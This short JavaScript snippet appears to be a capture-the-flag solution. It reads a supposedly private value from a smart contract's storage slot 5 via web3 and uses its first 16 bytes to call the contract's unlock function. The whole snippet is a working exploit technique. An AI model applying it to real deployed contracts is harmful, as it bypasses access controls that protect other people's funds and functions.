const key = await web3.eth.getStorageAt(
  "0xC0fbFBEEA7B7625Fb96E08B91B93918144Fc2bb4",
  5
);
const keyBytes16 = key.slice(0, 34);
await contract.unlock(keyBytes16);
